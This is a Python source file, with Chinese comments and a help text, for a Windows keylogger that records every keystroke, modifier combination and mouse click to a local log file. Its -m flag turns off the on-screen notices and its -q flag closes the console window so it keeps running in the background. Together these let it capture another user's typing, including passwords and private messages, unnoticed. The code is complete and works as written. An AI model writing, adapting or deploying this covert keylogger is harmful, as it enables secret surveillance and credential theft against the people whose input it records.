import logging
from pynput import keyboard, mouse
import os
import win32gui
import win32con
import tkinter as tk
from tkinter import messagebox
import threading
import sys
import time

class InputLogger:
    def __init__(self, log_file="keyboard_log.txt", show_popups=True, quit_window=False):
        """初始化输入记录器，支持键盘和鼠标记录"""
        self.log_file = log_file
        self.show_popups = show_popups  # 控制是否显示弹窗
        self.quit_window = quit_window  # 控制是否退出窗口进程
        self._initialize_log_file()
        self._setup_logger()
        self.keyboard_listener = None
        self.mouse_listener = None
        
        # 键盘修饰键状态
        self.ctrl_pressed = False
        self.shift_pressed = False
        self.alt_pressed = False
        
        # 控制字符映射表
        self.control_chars = {
            '\x01':'a','\x02':'b','\x03':'c','\x04':'d','\x05':'e','\x06':'f',
            '\x07':'g','\x08':'h','\x09':'i','\x0a':'j','\x0b':'k','\x0c':'l',
            '\x0d':'m','\x0e':'n','\x0f':'o','\x10':'p','\x11':'q','\x12':'r',
            '\x13':'s','\x14':'t','\x15':'u','\x16':'v','\x17':'w','\x18':'x',
            '\x19':'y','\x1a':'z'
        }
        
        # 根据参数决定是否显示启动弹窗
        if self.show_popups:
            threading.Thread(target=self._show_start_popup, daemon=True).start()

    def _initialize_log_file(self):
        """初始化日志文件"""
        if os.path.exists(self.log_file):
            try:
                os.remove(self.log_file)
            except Exception as e:
                logging.error(f"删除旧日志失败: {str(e)}")

    def _setup_logger(self):
        """配置日志"""
        log_dir = os.path.dirname(self.log_file)
        if log_dir and not os.path.exists(log_dir):
            os.makedirs(log_dir)
        
        logging.basicConfig(
            filename=self.log_file,
            level=logging.INFO,
            format='%(asctime)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S',
            encoding='utf-8'
        )

    def _show_start_popup(self):
        """启动提示弹窗"""
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo(
            title="提示",
            message="键盘鼠标捕捉已开启\n按下Ctrl+Shift+F12结束"
        )
        root.destroy()

    def _show_exit_popup(self):
        """退出提示弹窗"""
        if self.show_popups:  # 根据参数决定是否显示
            root = tk.Tk()
            root.withdraw()
            messagebox.showinfo(
                title="提示",
                message="键盘记录器已结束"
            )
            root.destroy()

    def _get_modifier_string(self):
        """获取修饰键字符串"""
        modifiers = []
        if self.ctrl_pressed: modifiers.append("ctrl")
        if self.shift_pressed: modifiers.append("shift")
        if self.alt_pressed: modifiers.append("alt")
        return "+".join(modifiers)

    # 键盘事件处理
    def _on_key_press(self, key):
        """键盘按下事件"""
        # 更新修饰键状态
        if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            self.ctrl_pressed = True
            return
        elif key in [keyboard.Key.shift_l, keyboard.Key.shift_r]:
            self.shift_pressed = True
            return
        elif key in [keyboard.Key.alt_l, keyboard.Key.alt_r]:
            self.alt_pressed = True
            return

        # 处理普通键/组合键
        modifier_str = self._get_modifier_string()
        try:
            key_char = key.char
            if self.ctrl_pressed and key_char in self.control_chars:
                key_char = self.control_chars[key_char]
                logging.info(f"Key pressed: {modifier_str}+{key_char}")
            else:
                if self.shift_pressed and key_char.islower():
                    key_char = key_char.upper()
                log_msg = f"Key pressed: {modifier_str}+{key_char}" if modifier_str else f"Key pressed: {key_char}"
                logging.info(log_msg)
        except AttributeError:
            key_name = key.name
            log_msg = f"Key pressed: {modifier_str}+{key_name}" if modifier_str else f"Key pressed: <{key_name}>"
            logging.info(log_msg)

    def _on_key_release(self, key):
        """键盘释放事件"""
        # 更新修饰键状态
        if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            self.ctrl_pressed = False
        elif key in [keyboard.Key.shift_l, keyboard.Key.shift_r]:
            self.shift_pressed = False
        elif key in [keyboard.Key.alt_l, keyboard.Key.alt_r]:
            self.alt_pressed = False

        # 检测退出快捷键
        if self.ctrl_pressed and self.shift_pressed and key == keyboard.Key.f12:
            logging.info("程序已停止 (Ctrl+Shift+F12组合键被按下)")
            # 停止所有监听
            self.stop_logging()
            # 显示退出弹窗
            threading.Thread(target=self._show_exit_popup, daemon=True).start()
            return False

    # 鼠标事件处理
    def _on_mouse_press(self, x, y, button, pressed):
        """鼠标按键事件（输出格式为'左键按下'/'左键松开'）"""
        # 获取鼠标按键名称
        button_name = self._get_mouse_button_name(button)
        # 构造事件类型字符串（按键+状态）
        event_type = f"{button_name}按下" if pressed else f"{button_name}松开"
        logging.info(f"Mouse: {event_type}")

    def _get_mouse_button_name(self, button):
        """转换鼠标按键枚举为名称"""
        if button == mouse.Button.left:
            return "左键"
        elif button == mouse.Button.right:
            return "右键"
        elif button == mouse.Button.middle:
            return "中间键"
        else:
            return str(button)

    def start_logging(self):
        """开始记录输入事件"""
        # 启动键盘监听
        self.keyboard_listener = keyboard.Listener(
            on_press=self._on_key_press,
            on_release=self._on_key_release
        )
        self.keyboard_listener.start()
        
        # 启动鼠标监听
        self.mouse_listener = mouse.Listener(
            on_click=self._on_mouse_press
        )
        self.mouse_listener.start()
        
        # 根据参数决定是否退出窗口进程
        if self.quit_window:
            self._exit_console_window()
        
        # 保持主线程运行
        while self.keyboard_listener.running and self.mouse_listener.running:
            time.sleep(0.1)

    def _exit_console_window(self):
        """退出当前控制台窗口进程"""
        try:
            # 获取当前控制台窗口句柄
            hwnd = win32gui.GetConsoleWindow()
            if hwnd != 0:
                # 发送关闭消息到控制台窗口
                win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
        except Exception as e:
            logging.error(f"退出窗口失败: {str(e)}")

    def stop_logging(self):
        """停止所有监听"""
        if self.keyboard_listener and self.keyboard_listener.running:
            self.keyboard_listener.stop()
        if self.mouse_listener and self.mouse_listener.running:
            self.mouse_listener.stop()

def show_help():
    """显示帮助信息"""
    help_text = """
键盘鼠标记录器 - 使用说明

功能: 记录键盘按键和鼠标点击事件，保存到keyboard_log.txt日志文件

使用方式:
  python app.py [参数]

可用参数:
  -h, -help, -?    显示本帮助信息
  -q               启动后自动退出控制台窗口（进程继续后台运行）
  -m               不显示启动和退出弹窗提示

退出方式:
  按下 Ctrl+Shift+F12 组合键停止记录并退出程序
    """
    print(help_text)

if __name__ == "__main__":
    # 检查是否需要显示帮助信息
    help_args = {"-h", "-help", "-?"}
    if help_args & set(sys.argv):
        show_help()
        sys.exit(0)
    
    # 解析其他命令行参数
    show_popups = "-m" not in sys.argv  # -m参数控制是否显示弹窗
    quit_window = "-q" in sys.argv      # -q参数控制是否退出窗口进程
    
    try:
        logger = InputLogger(show_popups=show_popups, quit_window=quit_window)
        logger.start_logging()  # 启动监听
    except Exception as e:
        logging.error(f"程序错误: {str(e)}")
